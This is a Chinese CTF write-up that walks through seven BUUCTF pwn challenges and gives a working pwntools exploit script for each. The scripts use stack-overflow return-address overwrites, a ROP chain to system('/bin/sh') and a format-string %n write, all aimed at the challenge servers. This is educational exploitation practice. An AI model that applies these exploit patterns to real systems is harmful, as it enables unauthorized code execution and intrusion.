# BUUCTF[PWN]

## 题目：warmup_csaw_2016

1. 地址：[warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)
2. ida打开，进main函数：![image-20240507204853587](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072048895.png)
3. gets函数的栈溢出：给出了sub_40060D函数的地址![image-20240507204928362](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072049397.png)
4. 直接，溢出到sub_40060D的地址即可：

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',28462)
payload = b'a'*(64+8)+p64(0x40060d)
p.sendline(payload)
p.interactive()
``````



## 题目：pwn1_sctf_2016

1. 地址：[pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)
2. ida打开进入vuln函数：![image-20240507213015640](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072130707.png)
3. 先找后门函数：get_flag![image-20240507213041278](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072130306.png)
4. 虽然说有fgets函数，但是限制了长度为32，但是看栈中 **返回地址距离** s有 **0x3c+4** ,不足以溢出到返回值：![image-20240507213231797](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072132847.png)
5. 重新来看一下vuln函数的逻辑找突破口：可以将输入的 **I** 替换 为 **you** ，相当于将一位变成了三位，再计算一下 **0x3c+4=3*21+1** ，所以我们要输入21个I外加另外任意一个字符，即可再字符串替换后溢出到返回值的位置。![image-20240507213936907](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072139986.png)
6. 攻击脚本如下：![image-20240507214247106](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072142145.png)

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',25670)

payload = b'I'*(21)+b'a'+p64(0x8048F0D)
p.sendline(payload)
p.interactive()

``````

## 题目：jarvisoj_level0

1. 地址：[jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)
2. 依旧ida打开，进入到vulnerable_function函数：buf只有128，但是输入有0x200，必有溢出。![image-20240507214757431](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072147466.png)
3. 找到后门函数：callsystem![image-20240507214845844](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072148877.png)
4. 栈中的偏移为 **128+8**：![image-20240507214927684](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072149720.png)
5. 解题脚本：![image-20240507215000428](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405072150461.png)

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',27519)

payload = b'I'*(128+8)+p64(0x400596)
p.sendline(payload)
p.interactive()

``````



## 题目：get_started_3dsctf_2016

1. 进main函数：程序提供了后门溢出函数gets，距离返回值只有56。![image-20240510222953507](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102229577.png)

![image-20240510223005248](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102230297.png)

2. 看后门函数get_flag：对输入进行一个判断，在栈上可以看到数据的位置，在栈溢出时可以直接写道栈上。![image-20240510223042459](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102230511.png)

![image-20240510223104704](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102231738.png)

3. 脚本如下：

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',27248)

door=0x80489A0
return_exit=0x804E6A0

payload = b'a'*(56)+p32(door)+p32(return_exit)+p32(0x308CD64F)+p32(0x195719D1)

	
p.sendline(payload)
p.interactive()

``````

4. 题目中get_flag函数退出时需要提供一个 **合适的返回值** (exit函数的地址)，保证程序正常退出，否则get_flag函数无法正常退出，输入在使用putchar输入在 **缓存区中的flag** 会因为程序的异常崩溃无法输出到终端上。

![image-20240510223710607](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102237677.png)

## bjdctf_2020_babystack

1. 进入main函数：简单的栈溢出，让我们输入数据的长度，当然越大越好。![image-20240510231719408](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102317460.png)
2. 再看一眼main的栈，和后门函数：![image-20240510231809938](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102318993.png)

![image-20240510231923575](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405102319218.png)

3. 攻击脚本：

``````python
from pwn import *
 
p = remote('node5.buuoj.cn',27064)

p.recvuntil(b"[+]Please input the length of your name:")
p.sendline(b'50')

door=0x4006E6

p.recvuntil(b"What's u name?")

payload = b'a'*(12+12)+p64(door+1)

	
p.sendline(payload)
p.interactive()

``````

## [第五空间2019 决赛]PWN5

1. 进入main函数：read函数指定了读取的大小，无法进行栈溢出，但是观察到 **printf(buf)**，存在格式化字符串漏洞。![image-20240511105854807](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405111058884.png)
2. 利用格式化字符串可以阿将 **dword_804C044**处的值进行修改，改为我们想要的输入的值，来达到使if条件判断通过的目的，**dword_804C044**的地址为 **0804C044** ,使用%n修改指定地址处的值时，需要确定我们写入数据的偏移，这样使用%n才能指定到相应的地址。

* 先使用 **AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p **来显示输入的数据的偏移：![image-20240511110633456](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405111106504.png)

* 可以看到输入的字符串偏移为 **10**，所以输入地址**0804C044**后需要将栈中偏移为10的数值(0804C044)所指向的地址处的值进行修改。

* 脚本如下,最后输入的passwd会进入atoi函数，这函数将 **字符串转** 化为对应的 **数字**：![image-20240511111115233](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405111111311.png)

  ```python
  from pwn import *
  
  p = remote('node5.buuoj.cn',27105)
  p.recvuntil(b"your name:")
  
  payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)+b'%10$n%11$n%12$n%13$n'
  p.sendline(payload)
  
  p.recvuntil(b"your passwd:")
  
  payload = str(0x10101010)
  p.sendline(payload.encode())
  p.interactive()
  ```

  ![image-20240511111140609](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405111111662.png)

## [HarekazeCTF2019]baby_rop

1. checksec检查后，时64位程序，ida打开进入main函数： **__isoc99_scanf**函数使用 **%s**，存在栈溢出 。![image-20240511210554361](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405112105415.png)
2. 没有现成的system("/bin/sh")，需要手动构造：存在 **system函数** 和 **/bin/sh** 字符串，直接使用system给其传参即可，但是注意这是64位的程序， **前6个参数**传递依靠寄存器。![image-20240511210719114](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405112107161.png)

![image-20240511210730969](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405112107017.png)

![image-20240511210933208](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405112109284.png)

3. system函数需要一个参数，直接使用rdi进行传参，但是栈溢出的main函数只有一个ret，所以需要找到程序中的 **pop rdi;ret**指令的地址，直接使用 **ROPgadget --binary babyrop --only "pop|ret"**指令查找程序中可能出现的指令组合：![image-20240511211205218](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405112112277.png)s

4. 可以看到在 **0x400683**指令处存在 **pop rdi ; ret**组合（即先执行pop rdi 再执行ret），这使得可以继续改变rip的值，跳转到后门函数system的地址处。

5. 脚本如下：

   ``````python
   from pwn import *
    
   p = remote('node5.buuoj.cn',29873)
   #p.recvuntil(b"What's your name?")
   sh_addr=0x601048
   rdi_addr=0x400683
   door=0x400490
   ret=0x400479
   payload = b'a'*(16+8)+p64(rdi_addr)+p64(sh_addr)+p64(door)	
   p.sendline(payload)
   p.interactive()
   
   ``````

6. 拿到shell后没有看到flag，使用 **find -name flag** 查找flag文件的路径，再显示：![image-20240511211648974](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405112116055.png)



7. 币了吧@~@